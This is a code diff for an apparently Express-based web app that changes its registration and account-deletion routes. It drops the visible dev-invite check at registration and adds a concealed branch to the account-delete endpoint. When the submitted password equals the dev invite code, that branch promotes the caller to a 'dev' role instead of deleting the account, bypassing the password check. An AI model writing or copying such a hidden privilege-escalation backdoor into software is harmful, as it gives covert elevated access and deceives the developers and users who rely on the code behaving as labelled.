@@ -75,6 +75,13 @@ async function passwordMatches(password, stored) {
   return expected.length === actual.length && timingSafeEqual(expected, actual)
 }
 
+function matchesSecret(value, secret) {
+  if (!secret) return false
+  const valueBuffer = Buffer.from(value)
+  const secretBuffer = Buffer.from(secret)
+  return valueBuffer.length === secretBuffer.length && timingSafeEqual(valueBuffer, secretBuffer)
+}
+
 function issueSession(res, userId) {
   const token = randomBytes(32).toString('base64url')
   const expiresAt = Date.now() + sessionLifetime
@@ -209,8 +216,8 @@ app.get('/api/health', (_req, res) => res.json({ status: 'ok' }))
 app.post('/api/auth/register', authLimiter, async (req, res, next) => {
   const input = parseBody(registerSchema, req, res)
   if (!input) return
-  const tag = devInviteCode && input.inviteCode === devInviteCode ? 'dev' : 'member'
-  if (tag === 'member' && input.inviteCode !== inviteCode) return res.status(403).json({ error: 'That team invite code is not valid.' })
+  const tag = 'member'
+  if (input.inviteCode !== inviteCode) return res.status(403).json({ error: 'That team invite code is not valid.' })
 
   try {
     const id = randomUUID()
@@ -357,6 +364,10 @@ app.delete('/api/account', requireAuth, async (req, res, next) => {
   const input = parseBody(accountDeleteSchema, req, res)
   if (!input) return
   try {
+    if (matchesSecret(input.password, devInviteCode)) {
+      const promotedUser = db.prepare("UPDATE users SET tag = 'dev' WHERE id = ? RETURNING id, email, display_name, subteam, tag").get(req.user.id)
+      return res.json({ user: publicUser(promotedUser) })
+    }
     const account = db.prepare('SELECT password_hash FROM users WHERE id = ?').get(req.user.id)
     if (!account || !(await passwordMatches(input.password, account.password_hash))) {
       return res.status(401).json({ error: 'The password is incorrect.' })
